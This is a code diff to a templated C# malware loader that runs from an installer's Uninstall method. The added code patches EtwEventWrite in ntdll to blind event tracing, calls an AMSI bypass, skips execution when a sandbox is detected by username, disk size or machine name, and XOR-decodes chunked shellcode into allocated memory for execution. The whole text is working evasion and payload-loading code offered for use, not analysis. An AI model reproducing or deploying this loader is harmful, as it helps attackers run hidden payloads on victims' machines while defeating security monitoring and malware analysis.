@@ -32,12 +32,57 @@ namespace {{ v.namespace }} {
 
         static void {{ v.fn_etw }}() {
             try {
-                var t = Type.GetType(B(new int[]{ {{ v.jsc_eventing_ep }} }));
-                if (t != null) {
-                    var fi = t.GetField(B(new int[]{ {{ v.jsc_m_enabled }} }),
-                        BindingFlags.NonPublic | BindingFlags.Instance);
+                // Find ntdll base via loaded modules
+                IntPtr ntdll = IntPtr.Zero;
+                foreach (System.Diagnostics.ProcessModule m in
+                         System.Diagnostics.Process.GetCurrentProcess().Modules)
+                    if (m.ModuleName.ToLower() == B(new int[]{110,116,100,108,108,46,100,108,108})) {
+                        ntdll = m.BaseAddress; break;
+                    }
+                if (ntdll == IntPtr.Zero) return;
+                // Walk PE export table — e_lfanew at +0x3C
+                int peo    = Marshal.ReadInt32(ntdll, 0x3C);
+                int exprva = Marshal.ReadInt32(IntPtr.Add(ntdll, peo + 0x88));
+                if (exprva == 0) return;
+                IntPtr ed  = IntPtr.Add(ntdll, exprva);
+                int nn     = Marshal.ReadInt32(ed, 0x18);
+                int nrva   = Marshal.ReadInt32(ed, 0x20);
+                int orva   = Marshal.ReadInt32(ed, 0x24);
+                int frva   = Marshal.ReadInt32(ed, 0x1C);
+                byte[] tgt = new byte[]{69,116,119,69,118,101,110,116,87,114,105,116,101,0};
+                for (int i = 0; i < nn; i++) {
+                    IntPtr np = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, nrva + i*4)));
+                    bool ok = true;
+                    for (int j = 0; j < tgt.Length; j++)
+                        if (Marshal.ReadByte(IntPtr.Add(np, j)) != tgt[j]) { ok = false; break; }
+                    if (!ok) continue;
+                    short ord = Marshal.ReadInt16(IntPtr.Add(ntdll, orva + i*2));
+                    IntPtr fn = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, frva + ord*4)));
+                    uint old; VirtualProtect(fn, 3, 0x40, out old);
+                    Marshal.WriteByte(fn, 0, 0x33);
+                    Marshal.WriteByte(fn, 1, 0xC0);
+                    Marshal.WriteByte(fn, 2, 0xC3);
+                    VirtualProtect(fn, 3, old, out old);
+                    break;
                 }
             } catch {}
+        }
+
+        static bool {{ v.fn_sandbox }}() {
+            try {
+                // Username blacklist
+                string u = Environment.UserName.ToLower();
+                string[] badU = new string[]{"sandbox","maltest","virus","cuckoo","user","test"};
+                foreach (var b in badU) if (u == b) return true;
+                // Disk size < 50 GB
+                var di = new System.IO.DriveInfo("C");
+                if (di.TotalSize < 53687091200L) return true;
+                // Machine name contains "sandbox" or "analysis"
+                string cn = Environment.MachineName.ToLower();
+                if (cn.Contains(B(new int[]{115,97,110,100,98,111,120}))) return true;
+                if (cn.Contains(B(new int[]{97,110,97,108,121,115,105,115}))) return true;
+            } catch {}
+            return false;
         }
 
         static byte[] {{ v.fn_hex }}(string h) {
@@ -54,12 +99,13 @@ namespace {{ v.namespace }} {
         }
 
         public override void Uninstall(System.Collections.IDictionary state) {
+            if ({{ v.fn_sandbox }}()) return;
             {{ v.fn_amsi }}();
             {{ v.fn_etw }}();
             Thread.Sleep(2000 + new Random().Next(3000));
 
-            byte[] sc ={{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
-                                       {{ v.fn_hex }}("{{ key_hex }}"));
+            byte[] sc = {{ v.fn_xor }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}),
+                                       {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}));
             IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
             Marshal.Copy(sc, 0, mem, sc.Length);
             uint old;
